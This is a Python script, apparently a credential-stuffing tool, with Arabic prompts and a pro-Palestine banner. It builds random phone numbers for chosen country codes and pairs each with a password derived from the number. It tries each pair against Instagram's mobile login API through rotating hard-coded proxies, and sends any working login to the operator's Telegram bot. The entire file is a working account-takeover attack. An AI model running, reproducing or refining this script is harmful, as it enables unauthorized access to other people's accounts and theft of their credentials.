import requests, json, re, random, pyfiglet, os
from uuid import uuid4
uid = str(uuid4())
import time
from time import sleep
from colorama import Fore

import sys

def j(z):
            for e in z:
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.3/10)
                
    
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
H = Fore.BLUE
def logo():
    p = pyfiglet.figlet_format('Palestine')
    print(F+p)
    print(f"""\033[1;37m---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : حصٲن طࢪؤٲدهُه 
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : Lengendvx3
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : Easy_Learn
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/Amryousif
---------------------------         
""")
    print('🕌🕌🕌🕌🕌🕌🕌🕌🕌🕌🕌🕌🕌🕌')
    print(Y+'------------------------')
    print(B+'تــــحـــيــا فـــلــــســـطــيـن حــره 🇵🇸')
    
    print(C+'------------------------')
    print('الـــقـــدس فـــلــــســـطــيـنــي 🇵🇸')
    
    print(Z1+'------------------------')

logo()
print('🇵🇸🇵🇸🇵🇸🇵🇸🇵🇸🇵🇸🇵🇸🇵🇸')
print(H)
print(f'''###############
{Y} 1 - ام خــــرم😜
{C} 2 - الــــصـــيــن
{B} 3 - الــكـــويــت
{F} 4 - الهــنــد
{B} 5 - الـمـغـرب
{Y} 6 - مــصـر
{X} 7- اضــافـه دولــه اخــري
{Z}###############''')

ask = input(F+'اخـــتــر دولــه ==> ')
print('')
print(B+'ارســلــك الــصــيـ د لـلــتـلـيـجـرام؟ ')
print('')
tele = input(C+'لو هترسل للتليجرام اكتب y او Y')
if tele == 'y':
    tok = input(Y+'تــوكــن بــوتــك == > ')
    id = input(X+'ايــدي حــســابـك بالـتـلــيـجــرام == > ')
elif tele == 'Y':
    tok = input(Y+'تــوكــن بــوتــك == > ')
    id = input(X+'ايــدي حــســابـك بالـتـلــيـجــرام == > ')
os.system('clear')
logo()
print('')
while True:
    cho = '0987654321'
    h = ['184.178.172.14:4145','72.210.252.134:46164','112.227.143.99:1080','192.111.135.18:18301','184.178.172.11:4145','72.195.114.169:4145','98.162.25.16:4145','184.178.172.18:15280','1.180.0.162:7302','98.162.25.23:4145','192.252.209.155:14455','72.221.164.34:60671','192.111.135.17:18302','72.195.34.58:4145','98.162.96.41:4145','192.252.214.20:15864','111.13.60.28:1080','70.166.167.38:57728','174.64.199.79:4145','184.178.172.14:4145']
    pro = random.choice(h)
    if ask == '1':
        use = str(''.join(random.choice(cho)for i in range(7)))
        username = '+97252'+use
        password = '052'+use
    if ask == '2':
        use = str(''.join(random.choice(cho)for i in range(7)))
        username = '+91926'+use
        password = '926'+use
    if ask == '3':
        use = str(''.join(random.choice(cho)for i in range(6)))
        username = '+96550'+use
        password = '50'+use
    if ask == '4':
        use = str(''.join(random.choice(cho)for i in range(7)))
        username = '+86457'+use
        password = '045'+use
    
    if ask == '5':
        use = str(''.join(random.choice(cho)for i in range(8)))
        username = '+21262'+use
        password = '06'+use
    if ask == '6':
        use = str(''.join(random.choice(cho)for i in range(6)))
        username = '+201185'+use
        password = '01185'+use
        
    if ask == '7':
        mk = input('ارسـل الـرقـم بـكـود الـدولـه == > ')
        nk = input('ارسـل الـرقـم بـدون كـود الـدولـه == > ')
        ko = input('ارسـل عـدد الارقـام المـتـبـقـيـه مـن الـرقـم == > ')
        use = str(''.join(random.choice(cho)for i in range(ko)))
        username = mk+use
        password = nk+use
        
        
    url = 'https://i.instagram.com/api/v1/accounts/login/'
    headers = {
     "Content-Length": "348",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": "Instagram 6.12.1 Android (29/10; 320dpi; 720x1352; HUAWEI; DRA-LX9; HWDRA-MR; mt6765; en_US)",
    "Cookie": "mid\u003dYoak8wABAAEURFqH44xj8xtd1oAA; csrftoken\u003dxW8F29zZyH2PTCO3hYqJOKfwogKyE7ca",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "en-US",
    "X-IG-Connection-Type": "WIFI",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"
  }
    token = 'ep9qRS4MvM5QpIhvwOvdhYdmLhQYZ7Ya'
    data = 'ig_sig_key_version=4&signed_body=a64be7a97055bf54ccaecb3d43be9047686a35ae92acc3ee23446626a907c16c.%7B%22username%22%3A%22'+username+'%22%2C%22password%22%3A%22'+password+'%22%2C%22device_id%22%3A%22android-19fb81ed1d6e404b%22%2C%22guid%22%3A%22'+uid+'%22%2C%22_csrftoken%22%3A%22'+token+'%22%7D'
    response = requests.post(url,headers=headers,data=data, proxies=dict(http='http://'+pro+'')).text
    (response)
    
    if 'logged_in_user' in response:
        print(F+'Success == > '+username+' | ' + password)
        if tele == 'y':
            tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text= ɴᴇᴡ تــم الــصــيـد بـرعــايـه فـــلــــســـطــيـن 🇵🇸\n==============================\n  ✥.ᴇᴍᴀɪʟ : {username} \n\n.✥. ᴘᴀssᴡᴏʀᴅ 🔐 : {password} \n-----------------------------------------\n.✥.Dev : @XDev_X1👨‍💻"
            i = requests.post(tlg)
        elif tele == 'Y':
            tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text= ɴᴇᴡ تــم الــصــيـد بـرعــايـه فـــلــــســـطــيـن 🇵🇸\n==============================\n  ✥.ᴇᴍᴀɪʟ : {username} \n\n.✥. ᴘᴀssᴡᴏʀᴅ 🔐 : {password} \n-----------------------------------------\n.✥.Dev : @XDev_X1"
            i = requests.post(tlg) 
    else:
        print(Z+'Failed == > '+username+' | ' + password)
        
